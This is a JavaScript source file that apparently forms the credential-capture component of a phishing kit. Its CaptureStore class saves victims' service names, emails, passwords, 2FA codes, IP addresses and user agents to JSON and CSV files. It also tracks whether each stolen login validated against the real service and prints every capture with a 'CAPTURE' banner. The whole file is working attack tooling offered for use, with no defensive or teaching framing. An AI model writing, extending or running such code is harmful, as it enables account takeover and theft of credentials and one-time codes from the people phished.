import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import chalk from 'chalk';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CAPTURES_DIR = path.join(__dirname, '..', 'captures');

if (!fs.existsSync(CAPTURES_DIR)) {
  fs.mkdirSync(CAPTURES_DIR, { recursive: true });
}

class CaptureStore {
  constructor() {
    this.credentials = [];
    this.load();
  }

  load() {
    const jsonPath = path.join(CAPTURES_DIR, 'credentials.json');
    if (fs.existsSync(jsonPath)) {
      try {
        this.credentials = JSON.parse(fs.readFileSync(jsonPath, 'utf-8'));
      } catch {}
    }
    const csvPath = path.join(CAPTURES_DIR, 'credentials.csv');
    if (!fs.existsSync(csvPath)) {
      fs.writeFileSync(csvPath, 'timestamp,service,email,password,2fa_code,validated,ip\n');
    }
  }

  save() {
    const jsonPath = path.join(CAPTURES_DIR, 'credentials.json');
    fs.writeFileSync(jsonPath, JSON.stringify(this.credentials, null, 2));
  }

  appendToCsv(entry) {
    const csvPath = path.join(CAPTURES_DIR, 'credentials.csv');
    const ip = (entry.ip || '').replace(/,/g, ' ');
    const ua = (entry.user_agent || '').replace(/,/g, ' ');
    fs.appendFileSync(csvPath,
      `${entry.timestamp},${entry.service},${entry.email},${entry.password},${entry.twofa_code || ''},${entry.validated},${ip}\n`
    );
  }

  add(entry) {
    const cred = {
      id: crypto.randomUUID().slice(0, 8),
      timestamp: new Date().toISOString(),
      service: entry.service,
      email: entry.email,
      password: entry.password,
      twofa_code: entry.twofa_code || null,
      validated: entry.validated || false,
      ip: entry.ip || '',
      user_agent: entry.user_agent || '',
      validation_message: entry.validation_message || '',
    };

    this.credentials.push(cred);
    this.save();
    this.printCapture(cred);

    return cred;
  }

  setValidation(id, isValid, message) {
    const cred = this.credentials.find(c => c.id === id);
    if (!cred) return;
    cred.validated = isValid;
    cred.validation_message = message;
    this.save();
    // Re-print CSV line for this entry
    this.rewriteCsv();
    this.printValidation(cred);
  }

  rewriteCsv() {
    const csvPath = path.join(CAPTURES_DIR, 'credentials.csv');
    const lines = ['timestamp,service,email,password,2fa_code,validated,ip'];
    for (const c of this.credentials) {
      const ip = (c.ip || '').replace(/,/g, ' ');
      lines.push(`${c.timestamp},${c.service},${c.email},${c.password},${c.twofa_code || ''},${c.validated},${ip}`);
    }
    fs.writeFileSync(csvPath, lines.join('\n') + '\n');
  }

  printCapture(cred) {
    console.log('\n' + chalk.gray('─'.repeat(50)));
    console.log(chalk.red('  🎣 CAPTURE'));
    console.log(chalk.gray('─'.repeat(50)));
    console.log(`  ${chalk.white('Service:')}  ${chalk.cyan(cred.service)}`);
    console.log(`  ${chalk.white('Email:')}    ${chalk.yellow(cred.email)}`);
    console.log(`  ${chalk.white('Password:')} ${chalk.yellow(cred.password)}`);
    if (cred.twofa_code) {
      console.log(`  ${chalk.white('2FA Code:')} ${chalk.magenta(cred.twofa_code)}`);
    }
    console.log(`  ${chalk.white('Status:')}   ${chalk.gray('⏳ Validating...')}`);
    console.log(`  ${chalk.white('IP:')}       ${chalk.gray(cred.ip)}`);
    console.log(`  ${chalk.white('Time:')}     ${chalk.gray(new Date(cred.timestamp).toLocaleString())}`);
    console.log(chalk.gray('─'.repeat(50)));
  }

  printValidation(cred) {
    const isValid = cred.validated;
    const msg = cred.validation_message || '';
    let statusBadge, statusColor;
    if (isValid === true) {
      statusBadge = '✓ VALID';
      statusColor = chalk.green;
    } else if (isValid === '2fa') {
      statusBadge = '🔐 2FA REQUIRED';
      statusColor = chalk.magenta;
    } else if (isValid === 'ambiguous') {
      statusBadge = '? AMBIGUOUS';
      statusColor = chalk.yellow;
    } else {
      statusBadge = '✗ INVALID';
      statusColor = chalk.red;
    }
    console.log(`  ${chalk.white('Status:')}   ${statusColor(statusBadge)}`);
    if (msg) {
      console.log(`  ${chalk.white('Detail:')}  ${chalk.gray(msg)}`);
    }
    console.log(chalk.gray('─'.repeat(50)) + '\n');
  }

  getAll() {
    return this.credentials;
  }

  count() {
    return this.credentials.length;
  }

  byService() {
    const counts = {};
    for (const c of this.credentials) {
      counts[c.service] = (counts[c.service] || 0) + 1;
    }
    return counts;
  }
}

export const captureStore = new CaptureStore();
